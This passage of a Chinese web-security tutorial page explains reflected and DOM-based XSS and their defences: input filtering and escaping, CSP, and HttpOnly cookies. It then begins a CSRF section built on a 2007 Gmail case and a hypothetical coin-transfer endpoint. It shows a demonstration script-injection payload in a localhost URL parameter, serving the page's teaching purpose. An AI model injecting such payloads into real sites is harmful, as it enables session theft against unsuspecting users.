punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>上面这两段代码，第一段是路由，第二段是视图，作用是将 URL 中 xss 参数的内容显示在页面。我们可以在本地演示下，比如打开 <code class="language-text">http://localhost:3000/?xss=123</code> 这个链接，这样在页面中展示就是“123”了（如下图），是正常的，没有问题的。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-29-27-100a93de5dca9bebe308f75abededa42-5e571.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 60.49382716049383%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABCElEQVQoz2OYOGlydk5uXn5hWXlldk5eckpaSmp6alpGRmZ2SWlFc0tbVXVtcUk5kF1aBkQgNUCpuPjE1avXMERExkhIyqqpaysqqSkpqykpqUlKyYpLSIuKSYqISkpKyYlLyIiKScGRgKCIoJAoAyNrW3snw5kzZ3fs2Llnz97tO3YCGbt27QYytm/fsW3b9s2bt2zatBlIIqMtW7Zu3bZ9w8ZNN2/eYvhPAQBp/v79++07d+7du/fkyZO/RIN///6BNP/8+fPSpUtXrly5efMmkE2azb9+/Xr//j1Q2xcwIE0z0A1Al5PpZwj4BwMka8alB79xFEcVVvD169d37969ffsWT3AAAOHmY+shrogqAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 29 27"\n        title=""\n        src="/static/2021-07-15-14-29-27-100a93de5dca9bebe308f75abededa42-fee1c.png"\n        srcset="/static/2021-07-15-14-29-27-100a93de5dca9bebe308f75abededa42-a67b7.png 200w,\n/static/2021-07-15-14-29-27-100a93de5dca9bebe308f75abededa42-0b187.png 400w,\n/static/2021-07-15-14-29-27-100a93de5dca9bebe308f75abededa42-fee1c.png 800w,\n/static/2021-07-15-14-29-27-100a93de5dca9bebe308f75abededa42-b1a91.png 1200w,\n/static/2021-07-15-14-29-27-100a93de5dca9bebe308f75abededa42-5e571.png 1458w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>但当打开 <code class="language-text">http://localhost:3000/?xss=&lt;script&gt;alert(&#39;你被xss攻击了&#39;)&lt;/script&gt;</code> 这段 URL 时，其结果如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-30-00-fca6a8cfb4db97ad205cd1e6b18859f0-63b15.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 42.31884057971015%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABeUlEQVQY042NS0sCURiG55fYqpnxks44VmqZ5aJoG/2I/kSRUDq2yDS1ndI62rZoJ6UpJQh5AXWEcNQxk7zO6NxOx4GghYseXs73fnDe90N4nm82m5xGS6PdnptGg+12uwxTr9aYWo2pQmpwMlDQQFUqVSSVfrFSa84N95bbY3e4CNJG2dYJgjJbrMcnp/HEbSQai8ZurkJhmg6c+2g/feH3B3w+2us9Q1KptJVadTo37XaHybSC43pcr0dRTKdbCocjAABZloGGMJkO+rwkK+CXedhoNJEkaTAYMAzFcQxFlx0Ou8vlugyGVFXN5/Msy8Kv370+x9SFr5Y87AFhIM8EJJPJms2ExQLjFEFaocwWYnvHs7u3H76eX1YUBVaoAEgT/inXuk9xD1moDtsTkdFoXCiWiqXyX70Xiq9vuU7nE4a1IJAV+KrBpHAQHx/dTQ4To8eyiID/oTWAMic9M7Pch5iszrihjMBiZRGiKE6nU0mSoIHrwsYfwQxlaRirtI4AAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 30 00"\n        title=""\n        src="/static/2021-07-15-14-30-00-fca6a8cfb4db97ad205cd1e6b18859f0-fee1c.png"\n        srcset="/static/2021-07-15-14-30-00-fca6a8cfb4db97ad205cd1e6b18859f0-a67b7.png 200w,\n/static/2021-07-15-14-30-00-fca6a8cfb4db97ad205cd1e6b18859f0-0b187.png 400w,\n/static/2021-07-15-14-30-00-fca6a8cfb4db97ad205cd1e6b18859f0-fee1c.png 800w,\n/static/2021-07-15-14-30-00-fca6a8cfb4db97ad205cd1e6b18859f0-b1a91.png 1200w,\n/static/2021-07-15-14-30-00-fca6a8cfb4db97ad205cd1e6b18859f0-63b15.png 1380w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>通过这个操作，我们会发现用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。在现实生活中，黑客经常会通过 QQ 群或者邮件等渠道诱导用户去点击这些恶意链接，所以对于一些链接我们一定要慎之又慎。</p>\n<p>另外需要注意的是，Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方。</p>\n<h3 id="基于-dom-的-xss-攻击"><a href="#%E5%9F%BA%E4%BA%8E-dom-%E7%9A%84-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>基于 DOM 的 XSS 攻击</h3>\n<p>基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据</p>\n<h2 id="如何阻止-xss-攻击"><a href="#%E5%A6%82%E4%BD%95%E9%98%BB%E6%AD%A2-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何阻止 XSS 攻击</h2>\n<p>我们知道存储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理的，因此可以认为这两种类型的漏洞是服务端的安全漏洞。而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此基于 DOM 的 XSS 攻击是属于前端的安全漏洞。</p>\n<p>但无论是何种类型的 XSS 攻击，它们都有一个共同点，那就是首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。</p>\n<p>所以要阻止 XSS 攻击，我们可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。</p>\n<p>接下来我们就来看看一些常用的阻止 XSS 攻击的策略</p>\n<h3 id="服务器对输入脚本进行过滤或转码"><a href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E8%BE%93%E5%85%A5%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4%E6%88%96%E8%BD%AC%E7%A0%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>服务器对输入脚本进行过滤或转码</h3>\n<p>不管是反射型还是存储型 XSS 攻击，我们都可以在服务器端将一些关键的字符进行转码，比如最典型的：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="30259160549940380000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`code:<script>alert(\'你被 xss 攻击了\')</script>`, `30259160549940380000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">code:&lt;script&gt;alert(&#39;你被 xss 攻击了&#39;)&lt;/script&gt;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>这段代码过滤后，只留下了 code</p>\n<p>这样，当用户再次请求该页面时，由于 <code class="language-text">&lt;script&gt;</code> 标签的内容都被过滤了，所以这段脚本在客户端是不可能被执行的。</p>\n<p>除了过滤之外，服务器还可以对这些内容进行转码，还是上面那段代码，经过转码之后，效果如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="90465482729658170000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`code:&lt;script&gt;alert(&#39;你被 xss 攻击了&#39;)&lt;/script&gt;`, `90465482729658170000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">code:&amp;lt;script&amp;gt;alert(&amp;#39;你被 xss 攻击了&amp;#39;)&amp;lt;/script&amp;gt;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>经过转码之后的内容，如 <code class="language-text">&lt;script&gt;</code> 标签被转换为 <code class="language-text">&amp;lt;script&amp;gt;</code>，因此即使这段脚本返回给页面，页面也不会执行这段脚本</p>\n<h3 id="充分利用-csp"><a href="#%E5%85%85%E5%88%86%E5%88%A9%E7%94%A8-csp" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>充分利用 CSP</h3>\n<p>虽然在服务器端执行过滤或者转码可以阻止 XSS 攻击的发生，但完全依靠服务器端依然是不够的，我们还需要把 CSP 等策略充分地利用起来，以降低 XSS 攻击带来的风险和后果。</p>\n<p>实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：</p>\n<ul>\n<li>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</li>\n<li>禁止向第三方域提交数据，这样用户数据也不会外泄；</li>\n<li>禁止执行内联脚本和未授权的脚本；</li>\n<li>还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。</li>\n</ul>\n<p>因此，利用好 CSP 能够有效降低 XSS 攻击的概率。</p>\n<h3 id="使用-httponly-属性"><a href="#%E4%BD%BF%E7%94%A8-httponly-%E5%B1%9E%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用 HttpOnly 属性</h3>\n<p>由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。</p>\n<p>通常服务器可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的，下面是打开 Google 时，HTTP 响应头中的一段</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="63227188977322710000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly`, `63227188977322710000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>我们可以看到，set-cookie 属性值最后使用了 HttpOnly 来标记该 Cookie。顾名思义，使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。我们还可以通过 Chrome 开发者工具来查看哪些 Cookie 被标记了 HttpOnly，如下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-33-07-3bd7155fc98da5103b0114133546aacd-33661.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 36.9098712446352%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABkElEQVQY02M4ffp0QUFBZWVlBRiUlZWXlpaWl1eUlIDIMhAoT0/PSElNLSoqBiorKy8vLK8oKCkpLipi2LBhg6GhoYmJib6+nrGhvrqqkramuqqygpaGmg4QqygCCaCIsZE+UFZHW9NQVyvQQMvVUFtbW4Nh06ZNNjY2bm6uVrYO5k5BepZetu5h1q4hZo4Bjp7hWkYOmkb2Vk5+ti4BTp4hhlbuxhbubY5WsVa2SsauDFu2bDEyMjI3MzUyt1O3j1O2idVxStB1TtS0izH0KzYKazMIabKIarWIarOMaTeKaNVxTKi2dwi185G1jgNptrWx8fDwsLCwUFKQU1VSUFJUUAJiKRHXlI68zf/z137JWv01d+3XwvVf8zf8sg/MrjJUitRXl1NUYNi4cSNQm52dnY6OjgIYKIKAspyUuE10Q+rSd6nzHybPf5yx6HHGwicJ858a2gdV6smF6ahJySsw7N69OzAwMDY21t/f3xwFmFnaOdt7BNt7BNm7B9qBka17oI2VdZu7dZqjlZGZOQAaE4hrVapP8AAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 33 07"\n        title=""\n        src="/static/2021-07-15-14-33-07-3bd7155fc98da5103b0114133546aacd-fee1c.png"\n        srcset="/static/2021-07-15-14-33-07-3bd7155fc98da5103b0114133546aacd-a67b7.png 200w,\n/static/2021-07-15-14-33-07-3bd7155fc98da5103b0114133546aacd-0b187.png 400w,\n/static/2021-07-15-14-33-07-3bd7155fc98da5103b0114133546aacd-fee1c.png 800w,\n/static/2021-07-15-14-33-07-3bd7155fc98da5103b0114133546aacd-b1a91.png 1200w,\n/static/2021-07-15-14-33-07-3bd7155fc98da5103b0114133546aacd-33661.png 1398w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从图中可以看出，NID 这个 Cookie 的 HttpOlny 属性是被勾选上的，所以 NID 的内容是无法通过 document.cookie 是来读取的。</p>\n<p>由于 JavaScript 无法读取设置了 HttpOnly 的 Cookie 数据，所以即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p>\n<h2 id="总结-4"><a href="#%E6%80%BB%E7%BB%93-4" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>XSS 攻击就是黑客往页面中注入恶意脚本，然后将页面的一些重要数据上传到恶意服务器。常见的三种 XSS 攻击模式是存储型 XSS 攻击、反射型 XSS 攻击和基于 DOM 的 XSS 攻击。</p>\n<p>这三种攻击方式的共同点是都需要往用户的页面中注入恶意脚本，然后再通过恶意脚本将用户数据上传到黑客的恶意服务器上。而三者的不同点在于注入的方式不一样，有通过服务器漏洞来进行注入的，还有在客户端直接注入的。</p>\n<p>针对这些 XSS 攻击，主要有三种防范策略，第一种是通过服务器对输入的内容进行过滤或者转码，第二种是充分利用好 CSP，第三种是使用 HttpOnly 来保护重要的 Cookie 信息。</p>\n<p>当然除了以上策略之外，我们还可以通过添加验证码防止脚本冒充用户提交危险操作。而对于一些不受信任的输入，还可以限制其输入长度，这样可以增大 XSS 攻击的难度</p>\n<h1 id="csrf-攻击：陌生链接不要随便点"><a href="#csrf-%E6%94%BB%E5%87%BB%EF%BC%9A%E9%99%8C%E7%94%9F%E9%93%BE%E6%8E%A5%E4%B8%8D%E8%A6%81%E9%9A%8F%E4%BE%BF%E7%82%B9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>CSRF 攻击：陌生链接不要随便点</h1>\n<p>XSS 的攻击方式是黑客往用户的页面中注入恶意脚本，然后再通过恶意脚本将用户页面的数据上传到黑客的服务器上，最后黑客再利用这些数据进行一些恶意操作。XSS 攻击能够带来很大的破坏性，不过另外一种类型的攻击也不容忽视，它就是我们今天要聊的 CSRF 攻击。</p>\n<p>相信你经常能听到的一句话：“别点那个链接，小心有病毒！”点击一个链接怎么就能染上病毒了呢？</p>\n<p>我们结合一个真实的关于 CSRF 攻击的典型案例来分析下，在 2007 年的某一天，David 无意间打开了 Gmail 邮箱中的一份邮件，并点击了该邮件中的一个链接。过了几天，David 就发现他的域名被盗了。不过几经周折，David 还是要回了他的域名，也弄清楚了他的域名之所以被盗，就是因为无意间点击的那个链接。</p>\n<p>那 David 的域名是怎么被盗的呢？</p>\n<p>我们结合下图来分析下 David 域名的被盗流程：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-34-17-61927278bc171ad48f0a5f7e937e3755-a8e2f.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 69.75476839237056%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABoUlEQVQoz31STW/bMAz1/0cPvfTSAu15wLDTgF6G/YWhGJCmjbMFtmPXloNYlqxvyqMkpHNTtO8gyCQfHx/lbPYelPQA84xXr6TUSs0nOOfoODLOJyG01hgBY0AI0Mpbk80Alg4QE4im7V+6PjYKn+D9drXarldl/jxxHtoxJou/qtohKwMpyPev3jmI5B/P9ufGRho2CDH1+FB9u/19d+VtiJu67O6//Lq+GP7kmSZteXPpGE3KT61Zvxi8WOuklHg6Thmp6806WYOJqyNptk9qpBlYG0ymKYOYU4IJIbquy/O8rmtlDOMTAMwLYE88M3Rl4zwJ2ljS94yx4/E4RIwjpXRY1oSyuNRINgan9LgzAFyvMQZPQkjbtuM4pp2fk+OCM3werfTU1HSz5lWJPpE8v8VnZCElmhSci2lCqZRA5aIocHgsgDjRkpwEMkwsu2IR8pGz2+2qqtrv98HxEDz7E/4rI3k5J5L16Yc569g0TVlVRVn2hCS9MPZS+XUQf3q8FDwcDvhsyK8j0GUgzx/Av8X77IdklErOu4izVb/iHxLOKmo986yRAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 34 17"\n        title=""\n        src="/static/2021-07-15-14-34-17-61927278bc171ad48f0a5f7e937e3755-fee1c.png"\n        srcset="/static/2021-07-15-14-34-17-61927278bc171ad48f0a5f7e937e3755-a67b7.png 200w,\n/static/2021-07-15-14-34-17-61927278bc171ad48f0a5f7e937e3755-0b187.png 400w,\n/static/2021-07-15-14-34-17-61927278bc171ad48f0a5f7e937e3755-fee1c.png 800w,\n/static/2021-07-15-14-34-17-61927278bc171ad48f0a5f7e937e3755-b1a91.png 1200w,\n/static/2021-07-15-14-34-17-61927278bc171ad48f0a5f7e937e3755-a8e2f.png 1468w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<ul>\n<li>首先 David 发起登录 Gmail 邮箱请求，然后 Gmail 服务器返回一些登录状态给 David 的浏览器，这些信息包括了 Cookie、Session 等，这样在 David 的浏览器中，Gmail 邮箱就处于登录状态了。</li>\n<li>接着黑客通过各种手段引诱 David 去打开他的链接，比如 hacker.com，然后在 hacker.com 页面中，黑客编写好了一个邮件过滤器，并通过 Gmail 提供的 HTTP 设置接口设置好了新的邮件过滤功能，该过滤器会将 David 所有的邮件都转发到黑客的邮箱中。</li>\n<li>最后的事情就很简单了，因为有了 David 的邮件内容，所以黑客就可以去域名服务商那边重置 David 域名账户的密码，重置好密码之后，就可以将其转出到黑客的账户了。</li>\n</ul>\n<p>以上就是 David 的域名被盗的完整过程，其中前两步就是我们今天要聊的 CSRF 攻击。David 在要回了他的域名之后，也将整个攻击过程分享到他的站点上了</p>\n<h2 id="什么是-csrf-攻击"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-csrf-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是 CSRF 攻击</h2>\n<p>CSRF 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事</p>\n<p>通常当用户打开了黑客的页面后，黑客有三种方式去实施 CSRF 攻击。</p>\n<p>下面我们以极客时间官网为例子，来分析这三种攻击方式都是怎么实施的。这里假设极客时间具有转账功能，可以通过 POST 或 Get 来实现转账，转账接口如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="36719174807385670000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`# 同时支持 POST 和 GET\n# 接口\nhttps://time.geekbang.org/sendcoin\n# 参数\n## 目标用户\nuser\n## 目标金额\nnumber`, `36719174807385670000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text"># 同时支持 POST 和 GET\n# 接口\nhttps://time.geekbang.org/sendcoin\n# 参数\n## 目标用户\nuser\n## 目标金额\nnumber</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>有了上面的转账接口，我们就可以来模拟 CSRF 攻击了。</p>\n<h3 id="自动发起-get-请求"><a href="#%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7-get-%E8%AF%B7%E6%B1%82" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" 